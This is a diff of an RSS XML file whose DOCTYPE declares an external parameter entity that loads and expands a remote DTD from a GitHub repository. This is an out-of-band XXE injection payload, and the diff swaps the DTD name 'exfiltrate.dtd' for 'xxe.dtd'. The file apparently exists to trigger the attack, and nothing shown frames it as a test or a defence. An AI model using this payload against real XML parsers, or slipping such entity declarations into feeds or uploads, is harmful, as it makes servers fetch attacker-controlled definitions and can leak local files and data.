@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE rss [
-    <!ENTITY % remote SYSTEM "https://raw.githubusercontent.com/kaisham/test/refs/heads/master/exfiltrate.dtd">
+    <!ENTITY % remote SYSTEM "https://raw.githubusercontent.com/kaisham/test/refs/heads/master/xxe.dtd">
     %remote;
 ]>
 <rss version="2.0">
